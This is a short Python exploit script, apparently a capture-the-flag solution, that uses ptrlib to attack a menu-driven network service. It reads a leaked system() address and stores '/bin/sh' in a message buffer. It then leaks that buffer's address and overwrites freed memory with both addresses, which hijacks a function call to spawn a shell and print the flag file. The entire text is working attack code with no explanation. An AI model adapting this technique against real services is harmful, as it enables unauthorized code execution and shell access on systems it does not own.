from ptrlib import u64, p64, Socket
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9999"))

sock = Socket(HOST, PORT)
system_addr = int(sock.recvlineafter("<system> = "), 16)

sock.sendlineafter("> ", "2")
sock.sendlineafter("Message: ", "/bin/sh")

sock.sendlineafter("> ", "4")
sock.recvuntil("message\n")
message_addr = int(sock.recvuntil("|")[:-2], 16)


sock.sendlineafter("> ", "3")

sock.sendlineafter("> ", "2")
sock.sendlineafter("Message: ", p64(system_addr) + p64(message_addr))

sock.sendlineafter("> ", "1")
sock.sendline("cat flag*")
print(sock.recvuntil("}"))
